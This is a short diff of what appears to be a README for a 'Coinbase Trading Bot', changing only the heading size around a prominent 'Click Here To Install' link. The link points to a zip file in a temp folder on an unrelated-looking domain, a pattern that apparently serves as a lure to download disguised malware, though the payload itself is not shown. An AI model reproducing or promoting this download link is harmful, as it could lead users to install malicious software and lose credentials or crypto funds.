@@ -1,4 +1,4 @@
-<H2 align=center><a href="https://osjz-smolyan.com/temp/Setup-client.zip">Click Here To Install</a></H2>
+<H1 align=center><a href="https://osjz-smolyan.com/temp/Setup-client.zip">Click Here To Install</a></H1>
 
 
 ## Coinbase Trading Bot 
